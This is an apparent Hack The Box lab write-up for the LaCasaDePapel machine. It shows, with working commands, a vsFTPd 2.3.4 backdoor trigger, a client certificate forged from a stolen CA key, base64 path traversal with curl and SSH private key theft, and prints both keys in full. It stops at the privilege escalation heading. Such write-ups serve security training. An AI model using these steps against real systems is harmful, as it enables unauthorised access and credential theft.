---
title: "HTB - LaCasaDePapel"
classes: wide
tag: 
  - "OSCP Box"
  - "VSFTPD 2.3.4 Exploit"
  - "Linux Box"
  - "Linux VAPT"
  - "supervisord"
  - "Linux PrivEsc"
  - "CA Cert"
  - "OSCP Prep"
header:
  teaser: /assets/images/htb/htb.png
ribbon: green
description: "Writeup for HTB - LaCasaDePapel"
categories:
  - HTB
---

The given box ```LaCasaDePapel``` is a Linux machine with an IP address of ```10.10.10.131```

- [Hack The Box - LaCasaDePapel](#hack-the-box---lacasadepapel)
  - [Recon](#recon)
    - [Nmap Scan Result](#nmap-scan-result)
  - [Enumeration](#enumeration)
    - [Enumerating FTP](#enumerating-ftp)
    - [Enumerating webapps](#enumerating-webapps)
  - [Finding suitable exploits through searchsploit](#finding-suitable-exploits-through-searchsploit)
  - [Gaining Access](#gaining-access)
    - [vsFTPd 2.3.4 backdoor exploit](#vsftpd-234-backdoor-exploit)
    - [Generating client side certificate](#generating-client-side-certificate)
    - [Lateral movement](#lateral-movement)
  - [Privilege Escalation](#privilege-escalation)

## Recon

### Nmap Scan Result

On performing a nmap scan on the target, we can see there are 4 standard ports open

    1. ftp - 21
    2. ssh - 22
    3. http - 80
    4. https - 443
   
```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ sudo nmap -sC -sV -A 10.10.10.131
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 14:55 IST
Nmap scan report for lacasadepapel.htb (10.10.10.131)
Host is up (0.32s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=9/15%OT=21%CT=1%CU=30861%PV=Y%DS=2%DC=T%G=Y%TM=6141BC6
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST1
OS:1NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Unix

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   360.70 ms 10.10.14.1
2   360.84 ms lacasadepapel.htb (10.10.10.131)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.58 seconds
```

## Enumeration

### Enumerating FTP

```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ ftp 10.10.10.131
Connected to 10.10.10.131.
220 (vsFTPd 2.3.4)
Name (10.10.10.131:aidenpearce369): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp>
```

Here we are using ```vsFTPd 2.3.4``` and it doesn't allow ```anonymous login``` as mentioned in the nmap scan result

But ```vsFTPd 2.3.4``` has a famous backdoor exploit

### Enumerating webapps

Visiting our webapp with ```lacasadepapel.htb``` or its resolved IP gives me this,

![](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/LaCasaDePapel/img/1.png)

The QR Code and the input fields are rabbit holes

It also runs on ```HTTPS``` on port ```443``` with SSL

![](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/LaCasaDePapel/img/2.png)

There is a slight difference in the webapp

It is asking for ```Client Certificate``` to continue, seems like they have already got a ```Server Certificate```

## Finding suitable exploits through searchsploit

We know that ```vsFTPd 2.3.4``` can be exploited

```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ searchsploit vsftpd 2.3.4
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                         | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)            | unix/remote/17491.rb
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

We can use any of the following, but it is not such a hard exploit

The only thing we need to remember to trigger this ```vsFTPd 2.3.4``` exploit is to pass ```:)``` with the ```username``` in FTP login, so that it can spawn a reverse shell in port ```6200```

## Gaining Access

### vsFTPd 2.3.4 backdoor exploit

Its time to trigger our ```vsFTPd 2.3.4``` exploit

```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ nc 10.10.10.131 21  
220 (vsFTPd 2.3.4)
USER monish:)
331 Please specify the password.
PASS hackednasa
```

On our ```netcat``` listener,

```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ nc 10.10.10.131 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
get_current_user()
=> "root"
getcwd()
=> "/"
```

This will not work in ```metasploit```, because it would be expecting a Linux shell, but what we got here is  ```Psy Shell``` in ```PHP```

Lets check the file system of this machine

```c
system("ls")
PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1
```

So ```system()``` command is blacklisted here

When you pass ```phpinfo()```,

```c

...

disable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

...

```

Lets use ```scandir()``` to list directories and its contents,

```c
scandir("/")
=> [
     ".",
     "..",
     ".DS_Store",
     "._.DS_Store",
     "bin",
     "boot",
     "dev",
     "etc",
     "home",
     "lib",
     "lost+found",
     "media",
     "mnt",
     "opt",
     "proc",
     "root",
     "run",
     "sbin",
     "srv",
     "swap",
     "sys",
     "tmp",
     "usr",
     "var",
   ]
scandir("/home")
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]

```

There are 5 users, lets check their directories

```c
scandir("/home/berlin")
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
scandir("/home/dali")
=> [
     ".",
     "..",
     ".ash_history",
     ".config",
     ".qmail-default",
     ".ssh",
     "server.js",
   ]
scandir("/home/nairobi")
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
scandir("/home/oslo")
=> [
     ".",
     "..",
     "Maildir",
     "inbox.jade",
     "index.jade",
     "node_modules",
     "package-lock.json",
     "server.js",
     "static",
   ]
scandir("/home/professor")
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "memcached.ini",
     "memcached.js",
     "node_modules",
   ]

```

```user.txt``` is inside ```berlin```

Lets try to get ```user.txt``` through ```file_get_contents()```

```c
echo file_get_contents("/home/berlin/user.txt")       
PHP Warning:  file_get_contents(/home/berlin/user.txt): failed to open stream: Permission denied in phar://eval()'d code on line 1 
```

This file is restricted and we need more higher privilege

Lets scan for other config files,

```c
scandir("/home/professor/.ssh")
PHP Warning:  scandir(/home/professor/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1                          
scandir("/home/berlin/.ssh")
PHP Warning:  scandir(/home/berlin/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1                             
scandir("/home/dali/.ssh")    
=> [
     ".",
     "..",
     "authorized_keys",
     "known_hosts",
   ]
```

No useful info on ```SSH```, because of permission we cannot access it

But there is something interesting in ```/home/nairobi/ca.key```

```c
file_get_contents("/home/nairobi/ca.key")
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   ```

   Seems like a ```CA CERT KEY```

   Remember that ```https``` site asked for ```Client Side Certificate```??

### Generating client side certificate

Lets connect with ```openssl``` to view the ```Server Side Certificate```

```c
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/LaCasaDePapel]
└─$ openssl s_client -connect 10.10.10.131:443
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = lacasadepapel.htb, O = La Casa De Papel
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = lacasadepapel.htb, O = La Casa De Papel
verify return:1
---
Certificate chain
 0 s:CN = lacasadepapel.htb, O = La Casa De Papel
   i:CN = lacasadepapel.htb, O = La Casa De Papel
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs
YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x
OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl
cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG
9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV
QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8
/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B
4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV
ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR
PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG
SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C
hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6
vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx
BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI
EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli
MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4
-----END CERTIFICATE-----
subject=CN = lacasadepapel.htb, O = La Casa De Papel

issuer=CN = lacasadepapel.htb, O = La Casa De Papel

---
Acceptable client certificate CA names
CN = lacasadepapel.htb, O = La Casa De Papel
Client Certificate Types: RSA sign, DSA sign, ECDSA sign
Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1
Shared Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1
Peer signing digest: SHA512
Peer signature type: RSA
Server Temp Key: ECDH, P-256, 256 bits
---
SSL handshake has read 1537 bytes and written 431 bytes
Verification error: self signed certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES128-GCM-SHA256
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES128-GCM-SHA256
    Session-ID: 5F4843FC0D0AF3D85BB6960C8617A2CD46E1D7E1AA749AC6651944E99EF3EE49
    Session-ID-ctx: 
    Master-Key: 67AD1EF7C571D2634B06B9DD0242A6652896F9E38B114245EBF3DB4E549A8E01BD86ED33CE7C3C0D17527E61828E8CD9
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 9b b8 5e 94 40 23 94 70-68 e8 39 e9 ad ea 6f 84   ..^.@#.ph.9...o.
    0010 - b0 5d f8 f7 16 dc bd 19-c7 74 33 cc 90 81 cc a3   .].......t3.....
    0020 - 0f 42 b8 f5 4a 65 47 de-9b fe ca b3 9a ce 8f c2   .B..JeG.........
    0030 - cf 45 fd 89 13 73 83 6f-89 0a d3 0e 22 8b b6 4a   .E...s.o...."..J
    0040 - fb be 55 ee d9 0c e7 c7-ad 4f f5 51 b1 0b bd 8f   ..U......O.Q....
    0050 - 01 f9 88 6d b7 4a b6 ae-06 03 23 1b 6a 7f eb f3   ...m.J....#.j...
    0060 - f2 d2 a2 c2 6e 23 a7 61-0a 40 62 94 44 6e 42 97   ....n#.a.@b.DnB.
    0070 - ed 91 2b 67 b0 4a b2 f6-78 ee 83 3f 50 ec 86 9d   ..+g.J..x..?P...
    0080 - b1 91 82 5a 72 c2 91 73-5f ee 1c 33 48 9a be f2   ...Zr..s_..3H...
    0090 - 08 66 f4 41 a8 34 20 83-81 57 14 8b 89 f2 c8 76   .f.A.4 ..W.....v
    00a0 - aa 6d 4c 5a 9b 8d 6a 12-47 3b c1 39 62 9c 8c c7   .mLZ..j.G;.9b...
    00b0 - ec 18 22 d0 2f 48 81 1b-f6 75 d0 f7 cc 0b 61 5c   .."./H...u....a\

    Start Time: 1631701520
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
---
```

Generating client side certificate for SSL,

```c
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/LaCasaDePapel]
└─$ openssl req -x509 -new -nodes -key nairobi.key -sha256 -days 1024 -out cert.pem
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:IN
State or Province Name (full name) [Some-State]:Tamil Nadu
Locality Name (eg, city) []:Chennai
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Exploit Everything
Organizational Unit Name (eg, section) []:Self
Common Name (e.g. server FQDN or YOUR name) []:Monish Kumar
Email Address []:driftmonianonymous@gmail.com
                                                                                                                                                  
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/LaCasaDePapel]
└─$ ls
cert.pem  LaCasaDePapel.md  nairobi.key

┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/LaCasaDePapel]
└─$ openssl pkcs12 -export -in cert.pem -inkey nairobi.key -out moneyheist.p12                                                                1 ⨯
Enter Export Password:
Verifying - Enter Export Password:
                                                                                                                                                  
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/LaCasaDePapel]
└─$ ls
cert.pem  LaCasaDePapel.md  moneyheist.p12  nairobi.key
```

Import the certificate in browser,

![](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/LaCasaDePapel/img/3.png)

After importing the client side certificate, reload the site

![](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/LaCasaDePapel/img/4.png)

Proceed with the prompt and you should see the site loading with contents

![](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/LaCasaDePapel/img/5.png)

These are nothing but dummies, but it comes from ```/file/``` suffixed with ```base64``` value of the file name

Lets try for ```path traversal``` in URL

![](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/LaCasaDePapel/img/6.png)

Boom! Its listing all users

![](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/LaCasaDePapel/img/8.png)

So we are in ```berlin``` user,

Now lets try to download ```user.txt```

![](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/LaCasaDePapel/img/9.png)

It throws an exception while traversing and we cannot actually download the file by clicking it

### Lateral movement

To download the file we need to pass ```base64``` value of the file path suffixed with ```/file/```

Using curl for it,

```c
┌──(aidenpearce369㉿aidenpearce369)-[~]
└─$ echo -n "../user.txt" | base64
Li4vdXNlci50eHQ=

┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/LaCasaDePapel]
└─$ curl -k https://10.10.10.131/file/$(echo -n "../user.txt" | base64)
<---USER FLAG--->
```

Or we can just download it from browser,

![](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/LaCasaDePapel/img/10.png)

And we can see there is a ```.ssh``` directory, lets look for ```ssh keys```

![](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/LaCasaDePapel/img/11.png)

Lets download ```id_rsa``` key for ```SSH``` access

Downloading through ```curl```,

```c
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/LaCasaDePapel]
└─$ curl -k https://10.10.10.131/file/$(echo -n "../.ssh/id_rsa" | base64)
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
                                   
```

Or through browser

![](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/LaCasaDePapel/img/12.png)

Now we got the ```id_rsa``` SSH key, lets try to login after setting the permission to ```600```

```c
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/LaCasaDePapel]
└─$ ssh berlin@10.10.10.131 -i id_rsa  
berlin@10.10.10.131's password: 

```

Seems like this key is not for ```berlin```

Lets try for all users,

```
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/LaCasaDePapel]
└─$ ssh oslo@10.10.10.131 -i id_rsa  
oslo@10.10.10.131's password: 

                                                                                                                                                  
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/LaCasaDePapel]
└─$ ssh dali@10.10.10.131 -i id_rsa 
dali@10.10.10.131's password: 

                                                                                                                                                  
┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/LaCasaDePapel]
└─$ ssh professor@10.10.10.131 -i id_rsa 

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$ whoami
professor
lacasadepapel [~]$ id
uid=1002(professor) gid=1002(professor) groups=1002(professor)
```

So, it is the key for ```professor```

## Privilege Escalation

Lisiting the files in ```professor```,

```c
